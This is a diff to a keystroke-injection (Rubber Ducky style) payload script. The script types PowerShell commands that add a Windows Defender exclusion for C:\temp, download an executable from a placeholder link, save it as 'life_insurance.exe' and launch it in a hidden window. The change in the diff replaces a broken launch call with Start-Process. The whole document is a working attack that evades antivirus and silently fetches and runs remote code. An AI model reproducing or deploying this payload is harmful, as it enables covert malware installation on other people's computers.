@@ -12,7 +12,7 @@ DELAY 2000
 STRING cd C:\; mkdir temp; cd temp; Add-MpPreference -ExclusionPath "C:\temp"
 ENTER
 DELAY 500
-STRING $down = New-Object System.Net.WebClient; $url = 'LINK_TO_EXE'; $file = 'C:\temp\life_insurance.exe'; $down.DownloadFile($url, $file); $exec = New-Object -com shell.application; $exec.shellexecute($file, ",", 'open', -WindowStyle Hidden);
+STRING $down = New-Object System.Net.WebClient; $url = 'LINK_TO_EXE'; $file = 'C:\temp\life_insurance.exe'; $down.DownloadFile($url, $file); Start-Process -FilePath life_insurance.exe -WindowStyle Hidden;
 ENTER
 DELAY 5000
 STRING exit
